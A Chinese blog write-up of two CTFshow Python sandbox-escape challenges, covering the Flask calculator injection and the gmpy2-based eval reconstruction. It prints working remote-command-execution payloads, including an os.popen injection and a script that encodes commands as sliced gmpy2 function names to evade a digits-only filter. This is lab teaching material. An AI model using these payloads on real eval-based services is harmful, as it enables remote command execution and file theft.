---
title: CTFshow 菜狗杯 python沙箱逃逸
swiper_index: 6
categories:
    -网络安全
tags:
  - python
  - ctfshow
  - RCE
abbrlink: 1
date: 2022-11-29 08:47:00
description: 酱紫？
updated: 2022-11-29 08:47:00
---

# CTFshow 算力超群
映入眼帘的是计算器，既然是计算器，说不定跟命令执行有关，抓个包看看
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/1.png" align='left'/>
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/2.png" align='left'/>

可以知道是用number1，operator和number2这三个变量控制数字1，符号和数字2，搞不好把数字换成别的会有意外惊喜，先把三个参数变成空
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/3.png" align='left'/>

报错了，还是flask模块，由报错找到了命令执行的地方，现在三个都为空，一个个试试看python命令执行代码
可知python进行系统命令执行需要os模块
那么直接使用\___import\___动态模块调用
Payload: \___import\___('os').popen('pwd').read()

<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/4.png" align='left'/>

Number1和operator都返回了 error，只有number2返回了正确结果，可能前面两个有什么奇怪的过滤吧

<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/5.png" align='left'/>


也尝试了一下system，subprocess，和commands模块，都没法用
system只是返回了0（状态号），不返回结果，其他两个也没法用

<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/6.png" align='left'/>

好，那接下来就开始找flag，这里想看一下根目录有啥，发现加了空格就报错了，可能是url编码的问题，换成+就没事了，成功找到flag

<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/7.png" align='left'/>
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/8.png" align='left'/>
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/9.png" align='left'/>
<br>
## python命令执行
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/10.png" align='left'/>
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/11.png" align='left'/>
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/12.png" align='left' width="%20" />

# CTFshow 算力升级

{% tip info %}
python沙箱逃逸：绕过模拟的 Python 终端，最终目标就是执行系统任意命令
{% endtip %}

代码审计
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/13.png" align='left' width="%20" />
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/14.png" align='left' width="%20" />

计算题，很明显是命令执行，但是有限制，需要绕过，这里限制了只能输入数字，但是这里有个例外，可以使用gmpy2库中的函数，打开本地看一看
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/15.png" align='left' width="%20" />

找到了**__builtins__**这个内建函数,这个函数是可以使用eval的
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/16.png" align='left' width="%20" />

那要怎么使用**__builtins__**中的eval呢，**利用gmpy2模块的函数进行拼接**，{% span cyan, 新姿势 %}

看下面这段代码
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/17.png" align='left'/>

[\]里的数只是用来选取数组编号的,那'remove'\[1\]就是remove的第二个字符e
原来是这样，那只要活用gmpy2模块的函数截取字符串拼接成\__builtins\__中的函数就可以了
先在本地测试一下 

``` 
gmpy2.__builtins__['eval'](eval(__import___('os').popen('whoami').read())) 
```

<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/18.png" align='left'/>

记住调用的方式,先用中括号将要调用的方法括起来
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/19.png" align='left'/>

官方提供了payload生成脚本
```
s="__import__('os').popen('cat /flag').read()"

import gmpy2

payload="gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]("

for i in s:
        if i not in "/'(). ":
                temp_index=0
                temp_string='x'*20
                for j in dir(gmpy2):
                        if j.find(i)>=0:
                                if len(j)<len(temp_string):
                                        temp_string=j
                                        temp_index=j.find(i)
                payload+=f'\'{temp_string}\'[{temp_index}]+'
        else:
                payload+=f'\"{i}\"+'

payload=payload[:-1]+')'
	
print(payload)
```

```
gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cmp'[0]+'ai'[0]+'cot'[2]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
```
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/20.png" align='left'/>

## python内建函数

要做这题的话需要了解一下\___builtins\___这个内建函数

{% tip info %}
什么是内建函数？
在启动python解释器后，即使没有创建任何的函数和变量，还是有许多函数能够使用，比如max(),len()等等
我们把这些函数称为内建函数，因为它们不需要我们去定义，在启动python解释器的时候，就已经导入到内存中供我们使用了
{% endtip %}
<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/21.png" align='left'/>

内建函数也是函数，虽然我们没有导入，那它们是存在于哪里呢？
其实准确的来说，python解释器启动后首先加载的是内建名称空间，内奸名称空间有许多名字到对象的映射，而这些名字其实就是内建函数的名字，对象就是这些内建函数本身，（注意区分函数名称和函数对象的区别），这些名称空间由\___builtins\___模块中的名字构成

<img  src="https://source.bugcarrot.top/articles/cfscgb/pyjail/22.png" align='left'/>
可以看到有一个__builtins__模块，这个模块本身定义了一个名称空间，即内建名称空间，dir（）的结构就是上上图

{% tip info %}
什么是名称空间？
在python中，所谓名称空间其实是指名称（标识符）到对象的映射，在python程序的正常执行过程中，至少存在两个名称空间
如果定义了函数，还会有局部名称空间，全局名称空间一般由程序员在程序的全局变量和他们对应的映射对象组成，而局部名称空间则在函数内部由函数函数局部变量和他们对应的映射对象组成
+ 内建名称空间 + 全局名称空间
{% endtip %}
